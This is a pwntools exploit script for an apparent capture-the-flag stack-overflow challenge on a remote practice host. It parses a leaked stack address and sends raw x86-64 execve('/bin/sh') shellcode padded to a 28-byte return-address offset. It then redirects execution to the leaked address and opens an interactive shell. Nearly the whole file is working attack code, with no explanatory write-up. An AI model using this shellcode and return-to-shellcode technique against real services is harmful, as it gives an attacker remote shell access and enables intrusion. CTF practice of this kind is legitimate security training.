#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=cytech.tcdn.casa' '--port=4104' 1-stack-04-ret2sc-no0
import re

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "1-stack-04-ret2sc-no0")
context.terminal = ["kitty"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or "cytech.tcdn.casa"
port = int(args.PORT or 4104)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        PIE enabled
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()
shellcode = b"\x48\x31\xf6\xb0\x3b\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x48\x89\xe7\x0f\x05"
io.recvuntil(b"at ")
raw = io.recvuntil(b"\n\n", drop=True)
m = re.search(rb"0x[0-9a-fA-F]+", raw)
leak_addr = int(m.group(0), 16)
print(repr(leak_addr))
saved_rip_offset = 28
if len(shellcode) > saved_rip_offset:
    raise SystemExit("Erreur : shellcode trop long pour l'offset donnÃ©")

padding_len = saved_rip_offset - len(shellcode)
padding = b"A" * (padding_len - 1)

return_addr = leak_addr

payload = shellcode + padding + p64(return_addr, endianness="little")
print(payload)
io.sendline(payload)

io.interactive()
